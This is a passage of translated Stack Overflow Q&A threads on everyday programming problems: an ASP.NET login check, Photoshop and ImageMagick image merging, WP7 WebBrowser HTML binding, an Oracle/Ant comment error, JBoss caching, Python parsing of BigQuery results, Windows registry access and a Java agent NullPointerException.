            if (dr[0].ToString() == TextBox1.Text && dr[1].ToString() == TextBox3.Text)
                {
                    if (Convert.ToInt16(dr[2].ToString()) == 2)
                    {
                        Response.Redirect("Admin.aspx");
                    }

                else if (Convert.ToInt16((dr[2])) == 1)

                    {
                        Response.Redirect("StudentFB.aspx");
                    }

                }   
        }
    }
    catch (Exception ex)
    {
        Response.Write(ex.Message); // if try fails display the error

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:26:46.423

`user`是保留关键字。引用它，用双引号`"user"`或括号`[user]`。

# image-processing - 合并文件夹中的文件（并排） Photoshop 脚本

> ID：13530943
> 
> 赞同：5
> 
> 时间：2012-11-23T14:20:34.730
> 
> 标签：image-processing, photoshop-script

我需要做以下事情。在文件夹中有多个 png 文件并设置命名约定：1.png 1_m.png、2.png 2_m.png（等等）。png 文件具有相同的宽度和高度（320 x 360 像素）。

**现在脚本应该执行以下操作：**

获取文件 1.png 1_m.png 并创建一个新文件，其中 1_m.png 位于左侧，1.png 位于右侧，将这两个文件合并到一个图层并将其保存为 1_done.png，运行此对文件夹中的所有文件执行操作。

这不一定是我在网上搜索但找不到任何有用的解决方案的 Photoshop 脚本。这里也没有什么是一成不变的，文件可能位于不同的文件夹中，这将是最简单的解决方案。我的 Photoshop 版本是 CS5

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T17:00:00.530

这个脚本会做你想做的事。将所有文件放在一个目录中，然后使用自动批处理 -> 脚本运行脚本。它会在文件名中找到一个没有和下划线的图像，然后打开它的配对名称文件（带有“_m”），将它们并排放置并在文件名中添加 _done 将其保存。

//首选像素 app.preferences.rulerUnits = Units.PIXELS;

```
var srcDoc = app.activeDocument;

// call the current document
var srcDoc = app.activeDocument;

// set original width and height
var imageW = srcDoc.width.value;
var imageH = srcDoc.height.value;

// get the info out of the source doc
var fileName = srcDoc.name;
var docName = fileName.substring(0,fileName.length -4);
var filePath = srcDoc.path.toString();
var fileExt = fileName.substring(fileName.length -4, fileName.length);

var nameCheck = fileName.substring(0,fileName.indexOf("_"));

if (nameCheck <1)
{
   // no underscore so we need to open it's namesake
   // alert(nameCheck)
   var filePair = filePath + "/" + docName + "_m" + fileExt;
   openThisFile(filePair)
   activeDocument.selection.selectAll()
   activeDocument.selection.copy();
   app.activeDocument.close(SaveOptions.DONOTSAVECHANGES);
   app.activeDocument = srcDoc;
   activeDocument.resizeCanvas(imageW *2, imageH, AnchorPosition.MIDDLELEFT);
   selectRect(0, imageW, imageW*2, imageH)
   activeDocument.paste()
   activeDocument.flatten();
   var newName = filePath + "/" + docName + "_done" + fileExt
   saveMe(newName)
}
    else
    {
      app.activeDocument.close(SaveOptions.DONOTSAVECHANGES);
    }

function openThisFile(masterFileNameAndPath)
{
 var fileRef = new File(masterFileNameAndPath)
 if (fileRef.exists)
 //open that doc
 {
    app.open(fileRef);
 }
 else
 {
    alert("error opening " + masterFileNameAndPath)
 }
}

function selectRect(top, left, right, bottom)
{
    srcDoc.selection.deselect()
    // =======================================================
    var id1 = charIDToTypeID( "setd" );
    var desc1 = new ActionDescriptor();
    var id2 = charIDToTypeID( "null" );
    var ref1 = new ActionReference();
    var id3 = charIDToTypeID( "Chnl" );
    var id4 = charIDToTypeID( "fsel" );
    ref1.putProperty( id3, id4 );
    desc1.putReference( id2, ref1 );
    var id5 = charIDToTypeID( "T   " );
    var desc2 = new ActionDescriptor();
    var id6 = charIDToTypeID( "Top " );
    var id7 = charIDToTypeID( "#Pxl" );
    desc2.putUnitDouble( id6, id7, top );
    var id8 = charIDToTypeID( "Left" );
    var id9 = charIDToTypeID( "#Pxl" );
    desc2.putUnitDouble( id8, id9, left );
    var id10 = charIDToTypeID( "Btom" );
    var id11 = charIDToTypeID( "#Pxl" );
    desc2.putUnitDouble( id10, id11, bottom );
    var id12 = charIDToTypeID( "Rght" );
    var id13 = charIDToTypeID( "#Pxl" );
    desc2.putUnitDouble( id12, id13, right );
    var id16 = charIDToTypeID( "Rctn" );
    desc1.putObject( id5, id16, desc2 );
    executeAction( id1, desc1, DialogModes.NO );
}

function saveMe(fPath)
{

// save out the image
var pngFile = new File(fPath);
pngSaveOptions = new PNGSaveOptions();
pngSaveOptions.embedColorProfile = true;
pngSaveOptions.formatOptions = FormatOptions.STANDARDBASELINE;
pngSaveOptions.matte = MatteType.NONE; pngSaveOptions.quality = 1;
activeDocument.saveAs(pngFile, pngSaveOptions, false, Extension.LOWERCASE);

// close that saved png
 app.activeDocument.close()
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-12-11T14:35:53.840

我会使用 ImageMagick 来做到这一点，它可免费用于 Windows、OSX 和 Linux——事实上它无论如何都安装在大多数 Linux 发行版上。

关键是用ImageMagick的`convert`命令把两张图片并排追加，基本上是这样的：

```
convert left.png right.png +append out.png 
```

所以脚本看起来像这样 - （近一半是评论）：

```
#!/bin/bash
for i in [0-9]*_m.png; do
    # Deduce name of left image
    left="$i"
    # Deduce name of right image
    right="${i/_m/}"
    # Deduce name of output image
    done="${i/_m/_done}"
    # Merge the little devils
    convert "$left" "$right" +append "$done"
done 
```

如果我们从这样的图像开始：

![在此处输入图像描述](../Images/7c059840a9bc7e043f927af76e02e863.png)

和

![在此处输入图像描述](../Images/8cc6b092e58ccf2a045389e1094d4295.png)

它将为所有对生成：

![在此处输入图像描述](../Images/86bd77b45d67e1e07e30f566f234e52a.png)

# windows-phone-7 - 设置 webbrowser 值 + windows phone

> ID：13530946
> 
> 赞同：1
> 
> 时间：2012-11-23T14:20:48.363
> 
> 标签：windows-phone-7, xaml, browser, windows-phone-8

我的属性描述中有一个 html。当我将此属性与文本块（例如 texthide）绑定时，它会在文本块中显示 html。但我无法将 WebBrowser 与此属性绑定。如何将 html 字符串绑定到 WebBrowser？

```
<ScrollViewer 
  HorizontalScrollBarVisibility="Disabled" 
  VerticalScrollBarVisibility="Auto" 
  Margin="25, 0, 0, 0" 
  Grid.Row="0">

  <StackPanel Orientation="Vertical">

    <TextBlock 
      x:Name="TextHide"  
      Text="{Binding Path=Descrption}" 
      Style="{StaticResource servicesText}" 
      TextWrapping="Wrap" />
    <phone:WebBrowser 
      Source="{Binding Descrption}" 
      x:Name="webBrowserHTML" 
      Foreground="Black" 
      Loaded="webBrowserHTML_Loaded" />

<!--<Image Source="../Images/cont_banner.png" Width="270"  Grid.Row="1"/>-->

    <Button Grid.Row="1">
      <Button.Background>
        <ImageBrush ImageSource="../Images/cont_banner.png" />
      </Button.Background>
      <Button.Content>
        <HyperlinkButton Content="" NavigateUri="callto:3950" />
      </Button.Content>
    </Button>

  </StackPanel>

</ScrollViewer> 
```

请问有什么想法吗？此致

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T20:53:18.627

为了能够将 HTML 直接绑定到`WebBrowser`控件，您必须创建一个附加属性：

```
namespace YourAppNamespace
{
    public static class WebBrowserHelper
    {
        public static readonly DependencyProperty HtmlProperty = DependencyProperty.RegisterAttached(
            "Html", typeof(string), typeof(WebBrowserHelper), new PropertyMetadata(OnHtmlChanged));

        public static string GetHtml(DependencyObject dependencyObject)
        {
            return (string)dependencyObject.GetValue(HtmlProperty);
        }

        public static void SetHtml(DependencyObject dependencyObject, string value)
        {
            dependencyObject.SetValue(HtmlProperty, value);
        }

        private static void OnHtmlChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
        {
            var browser = d as WebBrowser;

            if (browser == null)
                return;

            var html = e.NewValue.ToString();

            browser.NavigateToString(html);
        }
    }
} 
```

添加所需的 XAML 命名空间声明：

```
xmlns:cxi="clr-namespace:YourAppNamespace" 
```

并像这样使用它：

```
<phone:WebBrowser cxi:WebBrowserHelper.Html="{Binding Question.Body}" /> 
```

[资源](http://compiledexperience.com/blog/posts/binding-html-to-the-web-browser-control)

# sql - ORA-00911 在注释中使用双连字符时出错

> ID：13530952
> 
> 赞同：2
> 
> 时间：2012-11-23T14:21:23.720
> 
> 标签：sql, oracle, comments, ora-00911

我在 Windows Xp 32Bit 上运行 Oracle 11 Express 安装时遇到了问题。

当我通过 Ant 运行 SQL 脚本时，每次使用双连字符时都会引发 Ora-00911 错误。当我在 Unix 上的 Oracle 安装上运行完全相同的代码时，它就像一个魅力。

这是我的查询：

```
comment on table X.TABLE is 'Commenttest -- Testingtable'; 
```

是否有任何必须调整的配置？在我看来，有某种语法检查认为注释文本中有一个 SQL 注释。

知道是什么导致了这个错误吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:53:31.090

这是一个 Ant 错误：[https ://issues.apache.org/bugzilla/show_bug.cgi?id=43413](https://issues.apache.org/bugzilla/show_bug.cgi?id=43413)

您需要`keepformat="true"`在 sql 任务中包含该属性：

```
<sql driver="oracle.jdbc.OracleDriver"
     url="jdbc:oracle:thin....."
     userid="scott"
     password="tiger"
     keepformat="true">

   comment on table foo is 'Commenttest -- Testingtable';
</sql> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:27:16.180

看起来您缺少结束单引号：

```
comment on table X.TABLE is 'Commenttest -- Testingtable';
                                                        ^----add this single quote 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:27:34.433

您缺少终止报价，请添加如下：

```
 comment on table X.TABLE is 'Commenttest -- Testingtable'; 
```

# caching - 在 jboss 中全局禁用 EntityManager 缓存

> ID：13530960
> 
> 赞同：1
> 
> 时间：2012-11-23T14:21:41.820
> 
> 标签：caching, jboss, entitymanager

是否可以在某些 jboss 配置中使用 EntityManager 禁用缓存？

我会解释的。我有一些我们产品的最终“耳朵”，它通过休眠使用 EntityManager（类似这样，我是新手），我需要测试一些行为。对我来说，最简单的方法是直接在数据库中更改（删除、创建）实体的状态。但是在我这样做之后，应用程序仍然需要一段时间才能找到旧值。我读过一些用于实体管理器的 jboss 缓存。

所以，为了测试，我想禁用 EntityManager 缓存，但它不能在应用程序级别禁用，只能在 jboss 级别禁用。

简而言之：我需要应用程序**总是**重新加载实际的实体状态，因为它可以在数据库中与其他应用程序一起编辑。并且不可能在应用程序级别禁用缓存（hibernate.xml 和其他）

PS：jboss 4.2.3、ejb3、hibernate3

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T15:00:22.080

您所指的缓存可能是`PersistenceContext`. 它不能被禁用。你只能调整它的范围。在 Java EE 环境中，持久化上下文的范围是默认的事务。因此，如果您需要一些更改立即生效，您可以将这些更改（包括获取相关实体）提取到一个单独的方法中，并对其进行注释以要求新的事务：

```
@TransactionAttribute(TransactionAttributeType.REQUIRES_NEW) 
```

一旦方法返回，所有更改都将被提交。

您还可以使用 bean 管理的事务，这样您就可以自己控制提交。为此，使用`@TransactionManagement( TransactionManagementType.BEAN )`并使用注释您的 bean `UserTransaction`：

```
@Resource
private UserTransaction tx;
...
tx.begin();
//do stuff
tx.commit(); 
```

# html - 是否有无需单击即可检查 HTML 页面的工具？

> ID：13530963
> 
> 赞同：2
> 
> 时间：2012-11-23T14:21:48.263
> 
> 标签：html, google-chrome

我的问题是——当我**在 Chrome 中**的表单上单击任何输入控件上的向下按钮时，会显示一个弹出窗口。我很肯定我的代码没有这样做。它只发生在 Chrome 中的事实让我想起了一些行为不端的 Chrome 插件/扩展。

无论如何，我希望看到负责此弹出窗口的 HTML 元素。但是，我在开发工具中找不到它并且试图专注于它不起作用 - 当我单击页面时弹出窗口关闭。

所以，我的问题 - 有没有一种**简单**的方法可以在不点击页面的情况下抓住这个 HTML 元素？

![在此处输入图像描述](../Images/37cd821cc9e2a596d7d218977a5a36d1.png)

我正在使用具有以下扩展名的 Chrome 23.0.1271.64（根据 Chrome 本身）：

*   高级 REST 客户端 3.0.30
*   JSONView 0.0.32
*   OneClickDownload 1.2 网页版
*   开发者 0.4.1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:35:39.893

这看起来就像标准输入字段建议框。我怀疑它不是网页的一部分。因此它不会出现在 DOM 中，并且您无法设置它的样式，因为它是浏览器的一部分而不是网页（尽管它出现在网页的顶部）。

您可以通过将属性和值 autocomplete=off 放在表单字段上来抑制它，尽管这是来自 HTML5 并且目前不适用于所有浏览器。请参阅[是否有 W3C 有效的方法来禁用 HTML 表单中的自动完成功能？](https://stackoverflow.com/questions/582244/is-there-a-w3c-valid-way-to-disable-autocomplete-in-a-html-form)

# python - 使用 Python 解析数据以创建 json 数据对象

> ID：13530967
> 
> 赞同：9
> 
> 时间：2012-11-23T14:21:52.877
> 
> 标签：python, json, parsing, google-bigquery

这是我从 google bigquery 解析的数据：

```
{
    u'kind': u'bigquery#queryResponse',
    u'rows': [
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'995'
                },
                {
                    u'v': u'1600'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'942'
                },
                {
                    u'v': u'1607'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'937'
                },
                {
                    u'v': u'1599'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'894'
                },
                {
                    u'v': u'1598'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'848'
                },
                {
                    u'v': u'1592'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'841'
                },
                {
                    u'v': u'1590'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'786'
                },
                {
                    u'v': u'1603'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'779'
                },
                {
                    u'v': u'1609'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'762'
                },
                {
                    u'v': u'1597'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'753'
                },
                {
                    u'v': u'1594'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'740'
                },
                {
                    u'v': u'1596'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'738'
                },
                {
                    u'v': u'1612'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'718'
                },
                {
                    u'v': u'1590'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'717'
                },
                {
                    u'v': u'1610'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'715'
                },
                {
                    u'v': u'1602'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'680'
                },
                {
                    u'v': u'1606'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'674'
                },
                {
                    u'v': u'1603'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'639'
                },
                {
                    u'v': u'1603'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'637'
                },
                {
                    u'v': u'1603'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'634'
                },
                {
                    u'v': u'1590'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'633'
                },
                {
                    u'v': u'1599'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'616'
                },
                {
                    u'v': u'1596'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'614'
                },
                {
                    u'v': u'1596'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'612'
                },
                {
                    u'v': u'1595'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'607'
                },
                {
                    u'v': u'1603'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'579'
                },
                {
                    u'v': u'1593'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'570'
                },
                {
                    u'v': u'1600'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'541'
                },
                {
                    u'v': u'1599'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'525'
                },
                {
                    u'v': u'1608'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'520'
                },
                {
                    u'v': u'1599'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'518'
                },
                {
                    u'v': u'1602'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'486'
                },
                {
                    u'v': u'1595'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'470'
                },
                {
                    u'v': u'1593'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'433'
                },
                {
                    u'v': u'1609'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'429'
                },
                {
                    u'v': u'1607'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'421'
                },
                {
                    u'v': u'1611'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'399'
                },
                {
                    u'v': u'1592'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'363'
                },
                {
                    u'v': u'0'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'353'
                },
                {
                    u'v': u'1594'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'287'
                },
                {
                    u'v': u'1609'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'106'
                },
                {
                    u'v': u'0'
                }
            ]
        },
        {
            u'f': [
                {
                    u'v': u'the'
                },
                {
                    u'v': u'57'
                },
                {
                    u'v': u'1609'
                }
            ]
        }
    ],
    u'jobReference': {
        u'projectId': u'670640819051',
        u'jobId': u'job_5bf745fcee8b470e997d8ea90f380e68'
    },
    u'jobComplete': True,
    u'totalRows': u'42',
    u'schema': {
        u'fields': [
            {
                u'type': u'STRING',
                u'name': u'word',
                u'mode': u'NULLABLE'
            },
            {
                u'type': u'INTEGER',
                u'name': u'word_count',
                u'mode': u'NULLABLE'
            },
            {
                u'type': u'INTEGER',
                u'name': u'corpus_date',
                u'mode': u'NULLABLE'
            }
        ]
    }
} 
```

作为一名 Python 新手，我真的不知道如何解析这些数据以创建如下所示的 json 对象：

```
[
     {'count': 200, 'year': 2008},
     {'count': 240, 'year': 2010},
     {'count': 290, 'year': 2009}
] 
```

任何人都可以给我任何关于如何开始的提示吗？

**例子**

```
[{u'v': u'the'}, {u'v': u'995'}, {u'v': u'1600'}] 
```

在这个词`'the'`中，`count`是 995 和`year`1600。所以它遵循。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-23T14:41:13.610

如果“Z”是你的大字典，那么在“响应”上你会得到你需要的结构。

```
import json

response = []
for row in z['rows']:
    for key, dict_list in row.iteritems():
        count = dict_list[1]
        year = dict_list[2]
        response.append({'count': count['v'], 'year' : year['v']})

 print json.dumps(response) 
```

在回复时，您将获得以下信息：

```
[{'count': u'995', 'year': u'1600'},
 {'count': u'942', 'year': u'1607'},
 {'count': u'937', 'year': u'1599'},
 {'count': u'894', 'year': u'1598'},
 {'count': u'848', 'year': u'1592'},
 {'count': u'841', 'year': u'1590'},
 {'count': u'786', 'year': u'1603'},
 {'count': u'779', 'year': u'1609'},
 {'count': u'762', 'year': u'1597'},
 {'count': u'753', 'year': u'1594'},
 {'count': u'740', 'year': u'1596'},
 {'count': u'738', 'year': u'1612'},
 {'count': u'718', 'year': u'1590'},
 {'count': u'717', 'year': u'1610'},
 {'count': u'715', 'year': u'1602'},
 {'count': u'680', 'year': u'1606'},
 {'count': u'674', 'year': u'1603'},
 {'count': u'639', 'year': u'1603'},
 {'count': u'637', 'year': u'1603'},
 {'count': u'634', 'year': u'1590'},
 {'count': u'633', 'year': u'1599'},
 {'count': u'616', 'year': u'1596'},
 {'count': u'614', 'year': u'1596'},
 {'count': u'612', 'year': u'1595'},
 {'count': u'607', 'year': u'1603'},
 {'count': u'579', 'year': u'1593'},
 {'count': u'570', 'year': u'1600'},
 {'count': u'541', 'year': u'1599'},
 {'count': u'525', 'year': u'1608'},
 {'count': u'520', 'year': u'1599'},
 {'count': u'518', 'year': u'1602'},
 {'count': u'486', 'year': u'1595'},
 {'count': u'470', 'year': u'1593'},
 {'count': u'433', 'year': u'1609'},
 {'count': u'429', 'year': u'1607'},
 {'count': u'421', 'year': u'1611'},
 {'count': u'399', 'year': u'1592'},
 {'count': u'363', 'year': u'0'},
 {'count': u'353', 'year': u'1594'},
 {'count': u'287', 'year': u'1609'},
 {'count': u'106', 'year': u'0'},
 {'count': u'57', 'year': u'1609'}] 
```

我相信它是你所需要的。不仅仅是使用[json](http://docs.python.org/2/library/json.html)并对`json.dumps`响应进行处理，仅此而已。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-23T14:41:33.697

您可以使用 json 模块轻松地将 python 对象转换为 JSON 对象，反之亦然。基本上只有 2 个类：**JSONEncoder**和**JSONDecoder**：第一个将 Python 集合转换为 JSON 字符串，第二个将 JSON 字符串转换为 Python 对象。

例子：

```
from json import JSONEncoder

jsonString = JSONEncoder().encode({
  "count": 222, 
  "year": 2012
}) 
```

上面的代码将从 Python 字典生成 JSON 字符串

```
from json import JSONDecoder

pyDictionary = JSONDecoder().decode('{"count": 222, "year": 2012}') 
```

上面的代码将从 JSON 字符串生成一个 python 字典

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-04T21:19:32.227

[该库](https://pypi.org/project/google-cloud-bigquery/)的版本`0.28.0`和更高版本使用一个类来解析表或查询中的行。[`google-cloud-bigquery`](https://pypi.org/project/google-cloud-bigquery/)`Row`

例如打印出带有模式的查询的结果

```
[
   {
        u'type': u'STRING',
        u'name': u'word',
        u'mode': u'NULLABLE'
    },
    {
        u'type': u'INTEGER',
        u'name': u'word_count',
        u'mode': u'NULLABLE'
    },
    {
        u'type': u'INTEGER',
        u'name': u'corpus_date',
        u'mode': u'NULLABLE'
    },
] 
```

就像你的例子一样，一个人可以做

```
query = client.query('...')
rows = query.result()
for row in rows:
    # Access by column index.
    print('word: {}'.format(row[0]))
    # Access by column name.
    # The library parses the result into an integer object,
    # based on the schema.
    print('word_count: {}'.format(row['word_count']))
    # Access by column name, like an attribute.
    print('corpus_date: {}'.format(row.corpus_date)) 
```

在版本`0.29.0`（截至 2017 年 12 月 4 日尚未发布）中，将有用于`keys()`、`values()`、`items()`和`get()`的方法，就像内置字典对象一样。（在[PR #4393](https://github.com/GoogleCloudPlatform/google-cloud-python/pull/4393)中添加）因此，要将行转换为类似 JSON 的字典`0.29.0`：

```
query = client.query('...')
rows = query.result()
for row in rows:
    row_json = dict(row.items()) 
```

# c++ - RegOpenKeyEx 仅在 Windows XP 上失败

> ID：13530968
> 
> 赞同：1
> 
> 时间：2012-11-23T14:21:55.560
> 
> 标签：c++, visual-c++, registry

我有一段代码用于查找注册表项。在下面的当前形式中，它在 Vista 和 7 上运行良好，但在 XP 上返回错误代码 2 或 87。

当前代码（在大于 XP 的情况下工作）：

```
dwRet = RegOpenKeyEx( hKeyUsed, strRegCheck, 0, KEY_READ, &hKey ) ;

if ( dwRet == ERROR_SUCCESS ) 
{
    dwRet = RegQueryValueEx( hKey, strRegValue, NULL, NULL, (LPBYTE) PerfData, &cbData );

    while ( dwRet == ERROR_MORE_DATA )
    {
        // Get a buffer that is big enough.
        BufferSize += BYTEINCREMENT;
        PerfData = (PPERF_DATA_BLOCK) realloc( PerfData, BufferSize );
        cbData = BufferSize;
        dwRet = RegQueryValueEx( hKey, NULL, NULL, NULL, (LPBYTE) PerfData, &cbData );
    }
    if ( dwRet == ERROR_SUCCESS )
    {
        strSourcePath = PerfData->Signature;
        return true;
    }
} 
```

第一行似乎是问题所在，而第二个参数是导致它的原因。这是关于它的 MSDN 文档：http: [//msdn.microsoft.com/en-gb/library/windows/desktop/ms724897 (v=vs.85).aspx](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms724897(v=vs.85).aspx)

strRegCheck 是 CString 类型。如果在 Windows XP 上，我将其更改为

```
const LPCWSTR sKey = _T("CLSID\\{2933BF90-7B36-11D2-B20E-00C04F983E60}\\VersionList"); 
```

显然改变了'sKey'的第二个参数然后我们再次工作。

如果我将 sKey 设置为：

```
const LPCTSTR sKey = strRegCheck.GetBuffer(strRegCheck.GetLength()); 
```

然后我又回到了失败的土地上。有趣的是，如果我同时打开了 RegEdit，并且打开了我要搜索的密钥，那么它就不会失败。此外，我要么因错误 2 或 87 而失败。

我已经阅读了很多关于此的其他线程，但没有明确的答案。我有点急于完成这项工作，因此任何人都可以给我的任何指示都会受到极大的欢迎。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T10:47:55.943

我发现变量已经逃脱了反斜杠。这些字符串是从文本文件中读入的。我用双反斜杠替换了单个反斜杠，它可以工作。即便如此，谁能向我解释为什么这是因为我想更好地理解。我很想了解 Vista 和 7 是如何工作的，而 XP 却没有。

# java - 检查非空后空指针异常

> ID：13530986
> 
> 赞同：1
> 
> 时间：2012-11-23T14:23:01.620
> 
> 标签：java, nullpointerexception, java-bytecode-asm, javaagents

我在一个不应该为空的变量上有一个奇怪的 java.lang.NullPointerException。

```
Object[] params = new Object[10];
if (param1 != null)
    params[0] = param1; 
```

param1 作为方法参数给出，它可以为 null。通常，当影响 param1 到 params[0] 时，它不为空（否则它不会通过 if 语句）。

这是错误（第 144 行是“params[0] = param1;”）：

```
Exception in thread "Jalen Agent" java.lang.NullPointerException
    at jalen.MethodStats.onMethodEntry(MethodStats.java:144)
    at hanoi.TowersOfHanoi.solveHanoi(TowersOfHanoi.java)
    at hanoi.TowersOfHanoi.main(TowersOfHanoi.java:29) 
```

以下是发生异常的方法的完整代码：

```
public static void onMethodEntry(int id, String className, String methodName, Object param1, Object param2, Object param3, Object param4, Object param5) {
    synchronized (globalLock) {
        Object[] params = new Object[10];
        if (param1 != null)
            params[0] = param1;
        if (param2 != null)
            params[1] = param2;
        if (param3 != null)
            params[2] = param3;
        if (param4 != null)
            params[3] = param4;
        if (param5 != null)
            params[4] = param5;
        MethodStats.onMethodEntry(id, className, methodName, params);
    }
} 
```

**编辑：**

为了澄清我的例子，我处于以下情况：

1.  使用 ASM 检测 Java 应用程序
2.  在使用 Java 代理时运行新的检测类
3.  代理将使用检测代码收集的信息来运行一些测量
4.  代理还收集应用程序的方法参数值。

为此，在每个方法运行时都会执行 onMethodEntry。我有几种具有不同签名的方法。尤其是：

```
public static void onMethodEntry(int id, String className, String methodName, Object[] params) {
    synchronized (globalLock) {
        StringBuilder fullMethodName = new StringBuilder(className).append('.').append(methodName).append('-').append(Thread.currentThread().getId());
        MethodStats.addNewMethod(id, fullMethodName.toString());
        System.out.println(fullMethodName.toString() + " -- " + id);
        for (Object param : params) {
            if (param != null)
                System.out.println("Param: " + param.toString());
        }
        startTimes[depth] = System.nanoTime();
        stack[depth++] = MethodStats.getMethodInfo(id);
    }
}

public static void onMethodEntry(int id, String className, String methodName, Object param1) {
    synchronized (globalLock) {
        Object[] params = new Object[10];
        if (param1 != null)
            params[0] = param1;
        MethodStats.onMethodEntry(id, className, methodName, params);
    }
}

public static void onMethodEntry(int id, String className, String methodName, Object param1, Object param2) {
    synchronized (globalLock) {
        Object[] params = new Object[10];
        if (param1 != null)
            params[0] = param1;
        if (param2 != null)
            params[1] = param2;
        MethodStats.onMethodEntry(id, className, methodName, params);
    }
} 
```

这是我用于检测程序类的代码（即河内塔）：

```
public void visitCode() {
    mv.visitLdcInsn(new Integer(this.methodID));
    this.visitLdcInsn(this.className);
    this.visitLdcInsn(this.methodName);
    String paramCall = "";
    if (this.numParam > 0) {
        // Load parameters
        for (int i=1; i<=this.numParam; i++) {
            this.visitVarInsn(Opcodes.ALOAD, i);
            paramCall += "Ljava/lang/Object;";
        }
    }
    System.out.println(paramCall);
    mv.visitMethodInsn(Opcodes.INVOKESTATIC,
            "jalen/MethodStats",
            "onMethodEntry",
            "(ILjava/lang/String;Ljava/lang/String;" + paramCall + ")V");
    super.visitCode();
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:32:35.427

首先，错误*不在*行`params[0] = param1`，因为堆栈跟踪显示你的代码进入了`onMethodEntry`方法。

`if`添加语句绝对没有意义：如果`param1`是`null`，则不会有`null`赋值，但`params[0]`会*保留* `null`，因为 in 中的所有未赋值位置`new Object[10]`最初都设置为`null`。

为了解决这个问题，首先要弄清楚哪些对象必须放在数组中而不是`null`参数中，然后修改条件如下：

```
if (param1 != null) {
    params[0] = param1;
} else {
    params[0] = // something else
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:51:41.493

你为什么不更换你的

```
onMethodEntry(int id, String className, String methodName, Object[] params) { 
```

**可变参数**版本的方法：

```
onMethodEntry(int id, String className, String methodName, Object... params) { 
```

这样，您可以摆脱其他方法，它们都是相同的，只是参数数量不同。包含您的错误的方法也会消失。如果错误仍然存​​在，您离找到它又近了一步。此外，您不必更改调用该方法的任何代码，因为它的签名是相同的。

